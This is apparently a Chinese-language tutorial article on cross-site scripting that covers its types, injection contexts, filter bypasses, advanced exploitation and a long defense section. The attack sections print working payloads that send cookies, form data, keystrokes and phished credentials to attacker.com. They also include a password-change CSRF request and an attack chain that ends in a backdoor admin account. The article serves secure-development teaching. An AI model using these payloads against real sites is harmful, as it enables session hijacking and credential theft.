XSS 跨站脚本攻击：原理、攻击与防御

安全 Web安全 XSS
发布日期:   2026-08-06

一、XSS 的核心原理

1.1 本质：数据与代码的边界混淆

XSS（Cross-Site Scripting，跨站脚本攻击）的根本原因是用户可控数据被浏览器当作可执行代码解释。

这与 SQL 注入的逻辑完全同构——SQL 注入是用户输入被数据库引擎当作 SQL 指令执行，XSS 是用户输入被浏览器当作 JavaScript 执行。区别只在于执行环境不同：一个是数据库引擎，一个是浏览器渲染引擎。

浏览器解析 HTML 时，遇到 <script> 标签、事件处理属性（onerror、onload）、javascript: 伪协议等，会将其中的内容作为代码执行。如果这些位置的内容来自用户输入且未经转义，攻击者就能注入任意 JavaScript 代码。

1.2 为什么 XSS 危险

JavaScript 在浏览器中运行在同源策略（Same-Origin Policy）下，拥有对当前域名下 Cookie、localStorage、DOM 的完全访问权限。一段恶意脚本能做的事情包括：窃取 Cookie 和会话令牌、劫持用户操作（模拟点击、表单提交）、重定向到钓鱼页面、读取页面中的所有敏感数据（如银行卡号、个人信息）、利用用户身份调用后端 API。

如果配合社工手段，XSS 的危害会被进一步放大——攻击者不需要直接攻击服务端，而是让受害者自己的浏览器成为攻击载体。

二、XSS 的三种类型

2.1 反射型 XSS（Reflected）

恶意脚本出现在 HTTP 请求中（URL 参数、表单字段），服务端将其原样返回到响应页面里，浏览器解析时执行。

典型场景：搜索框回显用户输入。

https://example.com/search?q=<script>document.location='https://attacker.com/steal?c='+document.cookie</script>

服务端如果直接将 q 参数的值拼入 HTML：

// 危险写法
echo "<div class='result'>搜索结果：" . $_GET['q'] . "</div>";

浏览器渲染时，<script> 标签被执行，Cookie 被发送到攻击者服务器。

反射型 XSS 的特点是非持久化——恶意脚本不存储在服务端，每次都需要诱导用户点击包含恶意参数的链接。攻击面在于 URL 参数被回显到页面的所有位置。

2.2 存储型 XSS（Stored / Persistent）

恶意脚本被存储在服务端（数据库、文件系统），当其他用户访问包含该数据的页面时自动执行。

典型场景：评论区、个人简介、帖子内容、文件名展示。

<!-- 攻击者在评论区提交 -->
<img src=x onerror="fetch('https://attacker.com/steal?c='+document.cookie)">

这条评论被存入数据库。当其他用户浏览该页面时，服务端从数据库取出评论内容拼入 HTML，浏览器解析到 <img> 标签的 onerror 事件，脚本执行。

存储型 XSS 的危害远大于反射型，因为攻击者只需注入一次，所有访问该页面的用户都会中招。

2.3 DOM 型 XSS（DOM-based）

与前两种不同，DOM 型 XSS 的漏洞 entirely 发生在客户端。恶意数据从 DOM 中读取（如 location.hash、document.referrer、window.name），未经转义直接写入页面（如 innerHTML、document.write）。

// 危险写法
const hash = location.hash.slice(1);
document.getElementById('content').innerHTML = decodeURIComponent(hash);

攻击者构造 URL：https://example.com/page#<img src=x onerror=alert(1)>

这段代码从 location.hash 取出用户输入，直接赋给 innerHTML，浏览器解析并执行。整个过程中恶意数据从未到达服务端，所以传统的服务端 WAF 无法检测。

DOM 型 XSS 的 sink（危险操作）常见的有：innerHTML、outerHTML、document.write、document.writeln、eval、setTimeout（字符串参数）、new Function。source（数据来源）常见的有：location.hash、location.search、document.referrer、window.name、postMessage。

三、攻击手段全景

3.1 注入点与 Payload 形态

3.1.1 HTML 标签内注入

当用户输入被插入到 HTML 标签之间（如 <p>用户输入</p>），攻击者需要闭合当前标签或引入新标签：

<!-- 原始页面 -->
<p>搜索结果：用户输入</p>

<!-- 攻击者输入 -->
</p><script>alert(document.cookie)</script><p>

<!-- 渲染结果 -->
<p>搜索结果：</p><script>alert(document.cookie)</script><p></p>

3.1.2 HTML 属性内注入

当用户输入被放入属性值（如 <img src="用户输入">），攻击者需要闭合属性值和标签：

<!-- 原始页面 -->
<img src="用户输入" alt="avatar">

<!-- 攻击者输入 -->
" onerror="alert(1)" x="

<!-- 渲染结果 -->
<img src="" onerror="alert(1)" x="" alt="avatar">

3.1.3 JavaScript 代码块内注入

当用户输入被嵌入到 <script> 标签内的 JS 代码中：

<script>
  var userName = "用户输入";
</script>

攻击者输入 "; alert(document.cookie); //：

<script>
  var userName = ""; alert(document.cookie); //";
</script>

双引号闭合了字符串字面量，后面的代码被当作新的 JS 语句执行。

如果输入被放入单引号字符串，攻击者用 '; alert(1); //' 即可。如果没有引号包裹（如 var x = 用户输入;），攻击者可以直接输入 alert(1);//。

3.1.4 特殊上下文注入

某些 HTML 属性天然具有代码执行能力：

<!-- href 属性 -->
<a href="用户输入">点击</a>
<!-- 攻击者输入：javascript:alert(1) -->

<!-- style 属性（IE 低版本） -->
<div style="background:url(用户输入)">
<!-- 攻击者输入：javascript:alert(1) -->

<!-- src/iframe 属性 -->
<iframe src="用户输入"></iframe>
<!-- 攻击者输入：javascript:alert(1) -->

3.2 绕过过滤的常见技巧

3.2.1 大小写混合

<ScRiPt>alert(1)</ScRiPt>
<ImG sRc=x OnErRoR=alert(1)>

如果过滤逻辑只匹配小写 <script>，大小写混合即可绕过。

3.2.2 编码绕过

HTML 实体编码、URL 编码、Unicode 编码、Base64 编码，不同上下文有不同的解码时机：

<!-- HTML 实体编码 -->
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">

<!-- URL 编码（在 href 中） -->
<a href="javascript&#x3A;alert(1)">click</a>

<!-- Unicode 转义（在 JS 字符串中） -->
<script>var x = "\u0061\u006c\u0065\u0072\u0074(1)"</script>

3.2.3 利用不常见的标签和事件

<!-- SVG 标签 -->
<svg onload=alert(1)>
<svg/onload=alert(1)>

<!-- Body 标签 -->
<body onload=alert(1)>

<!-- Input 标签 -->
<input onfocus=alert(1) autofocus>

<!-- Details 标签 -->
<details open ontoggle=alert(1)>

<!-- Marquee 标签 -->
<marquee onstart=alert(1)>

<!-- Video/Audio 标签 -->
<video src=x onerror=alert(1)>

3.2.4 双写绕过

如果过滤逻辑只删除一次关键字（如将 <script> 替换为空），攻击者输入 <scr<script>ipt>alert(1)</scr</script>ipt>，删除内层后剩下 <script>alert(1)</script>。

3.2.5 利用注释和换行

<script>
// 如果过滤了 <script>，但没过滤 </script> 后的内容
</script> 后面的内容在某些解析器中仍可能被执行

3.2.6 利用浏览器解析差异

不同浏览器对 HTML 的容错解析行为不同。例如，某些浏览器会自动补全未闭合的标签，或者对嵌套关系有不同的理解。攻击者可以利用这些差异构造只在特定浏览器中触发的 payload。

3.3 高级攻击场景

3.3.1 XSS 窃取 Cookie 和 Session

new Image().src = 'https://attacker.com/steal?cookie=' + encodeURIComponent(document.cookie);

利用 <img> 标签发起 GET 请求，将 Cookie 作为 URL 参数发送到攻击者服务器。这种方式不会在页面上留下可见痕迹。

3.3.2 XSS 劫持用户操作（BeEF 框架思路）

// 拦截所有表单提交，注入隐藏字段
document.querySelectorAll('form').forEach(form => {
  form.addEventListener('submit', function(e) {
    e.preventDefault();
    // 将表单数据发送到攻击者服务器
    fetch('https://attacker.com/hook', {
      method: 'POST',
      body: new FormData(form)
    });
    // 然后正常提交
    form.submit();
  });
});

3.3.3 XSS + CSRF 组合攻击

// 利用用户的登录态，以用户身份发起 POST 请求修改密码
fetch('https://example.com/api/change-password', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  credentials: 'include',  // 携带 Cookie
  body: JSON.stringify({ newPassword: 'attacker_password' })
});

credentials: 'include' 确保请求携带目标域的 Cookie，后端无法区分这是用户主动操作还是 XSS 发起的请求。

3.3.4 XSS 键盘记录

document.addEventListener('keypress', function(e) {
  new Image().src = 'https://attacker.com/key?k=' + encodeURIComponent(e.key);
});

监听全局键盘事件，将每次按键发送到攻击者服务器。可以窃取用户在页面上输入的所有内容，包括密码。

3.3.5 利用 XSS 进行钓鱼

// 覆盖页面内容，伪造登录框
document.body.innerHTML = `
  <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999">
    <h2>会话已过期，请重新登录</h2>
    <form action="https://attacker.com/phish" method="POST">
      <input name="username" placeholder="用户名"><br>
      <input name="password" type="password" placeholder="密码"><br>
      <button type="submit">登录</button>
    </form>
  </div>
`;

用户看到的是一个逼真的”重新登录”弹窗，输入的凭据直接发送到攻击者服务器。

3.3.6 利用 postMessage 跨域通信

如果页面监听了 message 事件但没有校验 origin：

// 目标页面的危险代码
window.addEventListener('message', function(e) {
  document.getElementById('output').innerHTML = e.data;
});

// 攻击者在自己的页面上
<iframe src="https://target.com/vulnerable-page"></iframe>
<script>
  document.querySelector('iframe').contentWindow.postMessage('<img src=x onerror=alert(1)>', '*');
</script>

四、防御策略

4.1 输出编码（最核心的防御）

XSS 的本质是数据被当作代码执行，所以防御的核心是在数据插入 HTML 的位置做对应的编码，确保数据始终被当作数据处理。

不同上下文需要不同的编码方式：

HTML 标签之间（HTML Context）： 编码 & < > " '

// Java: 使用 OWASP Java Encoder
String safe = Encode.forHtml(userInput);
// & → &amp;  < → &lt;  > → &gt;  " → &quot;  ' → &#x27;

# Python: 使用 markupsafe
from markupsafe import escape
safe = escape(user_input)

// PHP
$safe = htmlspecialchars($userInput, ENT_QUOTES | ENT_HTML5, 'UTF-8');

HTML 属性值内（Attribute Context）： 除了上述字符，还需要编码更多特殊字符

String safe = Encode.forHtmlAttribute(userInput);

JavaScript 代码块内（JS Context）： 需要编码为 JS 字符串安全字符

String safe = Encode.forJavaScript(userInput);
// 编码 \xHH 形式，确保不会闭合字符串字面量

URL 参数中（URL Context）：

String safe = Encode.forUriComponent(userInput);

CSS 值内（CSS Context）：

String safe = Encode.forCssString(userInput);

核心原则：根据数据插入的位置选择对应的编码函数，不存在一种通用的编码适用于所有上下文。

4.2 Content Security Policy（CSP）

CSP 是浏览器层面的第二道防线，通过 HTTP 响应头告诉浏览器哪些来源的脚本可以执行：

Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com; object-src 'none'; base-uri 'self'

这条策略的含义：默认只允许加载同源资源；脚本只能从同源和 cdn.example.com 加载；禁止 <object>、<embed> 标签；<base> 标签只能指向同源。

CSP 的关键价值在于：即使存在 XSS 注入点，如果 CSP 禁止了内联脚本（unsafe-inline）且没有可被利用的脚本源，攻击者也无法执行任意代码。

CSP 的演进：

  • CSP Level 1：unsafe-inline 仍可被绕过，nonce 和 hash 机制引入
  • CSP Level 2：引入 nonce-xxx 和 sha256-xxx，精确控制可执行的脚本
  • CSP Level 3：引入 strict-dynamic，由受信任脚本动态加载的子脚本自动获得信任

推荐做法：使用 nonce 机制，每次请求生成随机 nonce，内联脚本必须携带匹配的 nonce 才能执行：

Content-Security-Policy: script-src 'nonce-rAnd0mV4lu3'

<script nonce="rAnd0mV4lu3">
  // 只有携带正确 nonce 的脚本才能执行
  console.log('safe');
</script>

4.3 HttpOnly Cookie

给敏感 Cookie 设置 HttpOnly 标志，阻止 JavaScript 通过 document.cookie 访问：

Set-Cookie: session_id=abc123; HttpOnly; Secure; SameSite=Strict

HttpOnly 阻止 JS 读取 Cookie，Secure 要求 HTTPS 传输，SameSite=Strict 阻止跨站请求携带 Cookie（防御 CSRF 的同时也降低了 XSS 窃取 Cookie 的价值）。

注意：HttpOnly 只保护 Cookie，不保护 localStorage 和 sessionStorage 中的数据。如果应用将 token 存在 localStorage 中，XSS 仍然可以通过 localStorage.getItem('token') 窃取。

4.4 输入验证

输入验证是辅助手段，不能替代输出编码，但能减少攻击面：

# 白名单验证：只允许预期字符
import re

def validate_username(username):
    if not re.match(r'^[a-zA-Z0-9_]{3,20}$', username):
        raise ValueError("Invalid username")
    return username

# 对于邮箱、URL 等有明确格式的数据，使用标准库验证
from email.utils import parseaddr
name, addr = parseaddr(user_input)
if not addr or '@' not in addr:
    raise ValueError("Invalid email")

输入验证的价值在于：在数据进入系统时就拦截明显恶意的内容，减少后续处理链路中的风险。但它不能覆盖所有 XSS 场景（合法输入中也可能包含需要编码的字符），所以必须配合输出编码。

4.5 使用安全的模板引擎

现代模板引擎默认对变量做 HTML 转义，大幅降低了 XSS 风险：

{# Jinja2 (Python/Flask)：默认转义 #}
<p>{{ user_input }}</p>
{# user_input 中的 < > & 等字符会被自动转义 #}

<!-- EJS (Node.js)：使用 <%= %> 自动转义 -->
<p><%= userInput %></p>

<!-- Thymeleaf (Java/Spring)：默认转义 -->
<p th:text="${userInput}"></p>

危险操作： 使用”原始输出”标签会跳过转义，必须确保数据已经过清洗：

{# Jinja2：|safe 过滤器跳过转义，危险！ #}
<p>{{ user_input | safe }}</p>

{# Django：|safe 过滤器同理 #}
<p>{{ user_input | safe }}</p>

4.6 框架内置防护

主流前端框架默认对插值做转义：

// React：默认转义 JSX 中的变量
<div>{userInput}</div>
// userInput 中的 <script> 会被转义为 &lt;script&gt;

// 危险操作：dangerouslySetInnerHTML 绕过转义
<div dangerouslySetInnerHTML={{__html: userInput}} />

<!-- Vue：{{ }} 默认转义 -->
<p>{{ userInput }}</p>

<!-- 危险操作：v-html 绕过转义 -->
<p v-html="userInput"></p>

<!-- Angular：[] 绑定默认转义 -->
<p>{{ userInput }}</p>

<!-- 危险操作：bypassSecurityTrustHtml 绕过转义 -->
<div [innerHTML]="sanitizedHtml"></div>

这些框架的默认行为是安全的，但开发者使用 dangerouslySetInnerHTML、v-html、bypassSecurityTrustHtml 等”逃生舱”时会主动放弃防护。

4.7 富文本场景的特殊处理

富文本编辑器允许用户提交 HTML，不能简单做全量转义。需要专门的 HTML 清洗：

// 使用 DOMPurify（推荐）
import DOMPurify from 'dompurify';
const clean = DOMPurify.sanitize(dirtyHtml, {
  ALLOWED_TAGS: ['p', 'b', 'i', 'em', 'strong', 'a', 'img', 'ul', 'ol', 'li'],
  ALLOWED_ATTR: ['href', 'src', 'alt', 'title', 'target'],
  ALLOW_DATA_ATTR: false
});

# Python: 使用 bleach
import bleach

clean = bleach.clean(dirty_html,
    tags=['p', 'b', 'i', 'em', 'strong', 'a', 'img'],
    attributes={'a': ['href', 'title'], 'img': ['src', 'alt']},
    strip=True
)

// Java: 使用 OWASP Java HTML Sanitizer
PolicyFactory policy = new HtmlPolicyBuilder()
    .allowElements("p", "b", "i", "em", "strong", "a", "img")
    .allowAttributes("href").onElements("a")
    .allowAttributes("src", "alt").onElements("img")
    .allowUrlProtocols("https")
    .toFactory();
String safeHtml = policy.sanitize(dirtyHtml);

关键配置要点：禁止 <script>、<iframe>、<object>、<embed> 标签；禁止 on* 事件属性；禁止 javascript: 协议的 URL；禁止 <style> 标签（CSS 也可用于攻击）。

五、各语言/框架常见陷阱

5.1 Java

  • JSP 的 <%= variable %> 不会自动转义（除非配置 escapeXml）
  • Spring MVC 的 @ResponseBody 返回 JSON 时，如果 Content-Type 设置错误（如 text/html），JSON 中的用户数据可能被浏览器当 HTML 解析
  • StringEscapeUtils.escapeHtml() 在旧版 Commons Lang 中不处理所有 Unicode 字符

5.2 PHP

  • echo $userInput 不做任何转义，是 XSS 最常见的根源
  • htmlspecialchars() 必须指定 ENT_QUOTES 和字符编码，否则单引号和特殊编码可能绕过
  • $_SERVER['PHP_SELF'] 包含 URL 路径，如果直接用于 form action 属性，路径部分可被注入
<!-- 危险：PHP_SELF 可被注入 -->
<form action="<?php echo $_SERVER['PHP_SELF']; ?>">

<!-- 如果访问 /page.php/<script>alert(1)</script> -->
<!-- 渲染为 -->
<form action="/page.php/<script>alert(1)</script>">

5.3 Python

  • Flask 的 render_template_string 如果使用 {{ variable | safe }} 会跳过转义
  • Django 的 mark_safe() 和 |safe 过滤器同理
  • json.dumps() 默认不转义 < > &，如果 JSON 被嵌入 HTML 页面，可能被 XSS 利用
# 危险：JSON 嵌入 HTML
<script>
  var data = {{ user_data | safe }};  # 如果 user_data 包含 </script>，会闭合标签
</script>

# 安全做法：使用 |tojson 过滤器（Flask 提供）
<script>
  var data = {{ user_data | tojson }};
</script>

5.4 Node.js

  • Express 的 res.send(userInput) 如果 Content-Type 是 text/html，直接输出未转义内容
  • res.json() 是安全的（Content-Type 为 application/json），但前端如果用 innerHTML 渲染 JSON 数据，仍然会触发 XSS
  • EJS 的 <%- %> 不转义，<%= %> 转义，容易混淆

六、完整防御清单

按优先级排列：

  1. 输出编码——根据插入上下文选择对应的编码函数（HTML/属性/JS/URL/CSS）
  2. 使用默认转义的模板引擎或前端框架，避免使用”逃生舱”
  3. 部署 CSP——禁止 unsafe-inline，使用 nonce 或 hash 机制
  4. 富文本场景使用专业 HTML 清洗库（DOMPurify / bleach / OWASP Sanitizer）
  5. 敏感 Cookie 设置 HttpOnly + Secure + SameSite
  6. 输入验证作为辅助——白名单校验格式固定的字段
  7. 避免将用户数据放入 innerHTML、document.write、eval 等 sink
  8. 对 JSON 嵌入 HTML 场景使用专用序列化（如 |tojson）
  9. 定期使用自动化扫描工具（如 OWASP ZAP、Burp Suite）检测 XSS
  10. 安全响应头：X-Content-Type-Options: nosniff、X-XSS-Protection（旧浏览器）

七、攻击链示例：从 XSS 到完全接管

一个典型的完整攻击链：

  1. 发现评论区存在存储型 XSS → 输入 <img src=x onerror=...> 未被过滤
  2. 脚本窃取管理员的 Cookie → 但 Cookie 设置了 HttpOnly，无法读取
  3. 改为利用 XSS 发起 CSRF 请求 → 以管理员身份调用 /api/admin/create-user 创建后门账户
  4. 或者：利用 XSS 注入键盘记录器 → 等待管理员在页面上输入敏感操作密码
  5. 如果 CSP 阻止了内联脚本 → 寻找 JSONP 端点或 CORS 配置错误来加载外部脚本
  6. 如果所有防御都到位 → 转向其他攻击面（SQL 注入、SSRF、文件上传等）

这条攻击链说明：XSS 不仅仅是一个”弹个 alert”的漏洞，它是攻击者进入用户浏览器上下文的入口，后续的利用空间取决于攻击者的创造力和系统的纵深防御水平。
